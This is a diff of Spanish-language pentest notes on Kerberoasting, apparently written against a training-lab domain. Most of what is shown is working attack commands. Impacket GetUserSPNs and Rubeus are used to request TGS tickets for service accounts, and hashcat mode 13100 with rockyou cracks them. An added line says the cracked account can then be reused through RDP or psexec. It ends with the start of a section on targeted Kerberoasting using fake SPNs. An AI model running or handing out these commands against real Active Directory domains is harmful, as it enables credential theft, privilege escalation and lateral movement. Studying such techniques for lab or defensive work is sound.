@@ -1,14 +1,14 @@
 #kerberoasting
 Técnica de escalada de privilegios y movimiento lateral. Se atacan cuentas asociadas a SPN solicitando tickets TGT, para posteriormente crackearlos con hashcat. Cualquier usuario autenticado en el AD puede solictar un ticket TGS.
 ## Linux
-Necesitamos tener credenciales de acceso (texto plano o NTML hash) y una shell en el contexto del usuario de dominio o `SYSTEM` shell
+Necesitamos tener credenciales de acceso (texto plano o NTML hash) y una shell en el contexto del usuario de dominio o `SYSTEM` shell. En los ejemplos suponemos que tenemos acceso al dominio con el usuario `forend`
 - Listar cuentas SPN - GetUserSPNs.py 
-	```bashowe
-	impacket-GetUserSPNs -dc-ip $target INLANEFREIGHT.LOCAL/forend
+	```bash
+	impacket-GetUserSPNs -dc-ip $dcip INLANEFREIGHT.LOCAL/forend
 	```
 - Solicitar todos los tickets TGS (añadir la flag `-requets` al comando anterior)
 	```bash
-	GetUserSPNs.py -dc-ip $target INLANEFREIGHT.LOCAL/forend -request -outputfile allTickets
+	GetUserSPNs.py -dc-ip $dcip INLANEFREIGHT.LOCAL/forend -request -outputfile allTickets
 	```
 - Solicitar el ticket de un solo servicio (ej: `sqldev`)
 	```bash
@@ -38,7 +38,8 @@ Tiene alguna opción adicional a las de PowerView
 	```
 - Extraer todos los tickets TGS
 	```powershell
-	Rubeus.exe kerberoast /nowrap
+	.\Rubeus.exe kerberoast /nowrap
+	.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
 	```
 - Extraer los tickets de las cuentas más valiosas (`admincount=1`)
 	```powershell
@@ -55,6 +56,7 @@ Las cuentas de servicio que tienen encriptación `AES 128/256`, también pueden 
 ```bash
 hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt
 ```
+- Una vez craqueado, lo consideramos como un usuario más (podemos intentar rdp ó impacket-psexec o similar sobre él)
 
 ## Kerberoasting dirigido
 La idea es tratar de craquear la cuenta de usuario que queramos creando un SPN falso asociado a ese usuario. Para poder realizar un ataque de este tipo necesitamos tener la capacidad de modificar o agregar SPNs en una cuenta de usuario. 
